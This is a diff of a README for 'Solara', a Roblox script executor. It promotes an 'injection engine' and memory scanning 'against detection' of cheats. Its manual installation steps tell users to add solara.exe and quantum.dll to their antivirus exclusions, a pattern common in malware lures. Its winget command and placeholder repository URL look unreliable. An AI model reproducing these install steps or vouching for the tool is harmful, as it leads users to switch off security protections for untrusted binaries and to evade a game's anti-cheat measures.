@@ -2,9 +2,7 @@
   <img src="https://github.com/yourusername/solara/blob/main/assets/banner.png?raw=true" width="800" alt="Solara Banner">
   
  
-
   ![License](https://img.shields.io/badge/license-MIT-blue?style=for-the-badge)
-  [![Discord](https://img.shields.io/discord/solara?style=for-the-badge)](https://discord.gg/solara)
 
   <h1>⚡ Solara - Next-Gen Roblox Script Execution</h1>
   <p>Experience Roblox like never before with lightning-fast injection and military-grade security</p>
@@ -28,19 +26,16 @@
 ## 🚀 Features That Revolutionize Scripting
 
 - **Quantum Injection Engine**  
-  ![Performance](https://progress-bar.dev/100/?title=Injection+Speed)  
   Proprietary injection technology leveraging multi-threaded execution
 
 - **Sentinel Security Suite**  
-  ![Security](https://progress-bar.dev/100/?title=Protection)  
+
   Real-time memory scanning + behavioral analysis against detection
 
 - **Nebula Script Hub**  
-  ![Scripts](https://progress-bar.dev/95/?title=Script+Compatibility)  
   Auto-updating repository with 1500+ curated scripts
 
 - **Astral Customization**  
-  ![UI](https://progress-bar.dev/100/?title=UI+Customization)  
   Fully themable interface with Lua scriptable widgets
 
 ## 📥 Installation Made Simple
@@ -50,7 +45,7 @@
 winget install solara-v2 --source github
 
 # Manual Installation
-1. Download latest release
+1. Download
 2. Add to antivirus exclusions:
    > solara.exe
    > /libs/quantum.dll
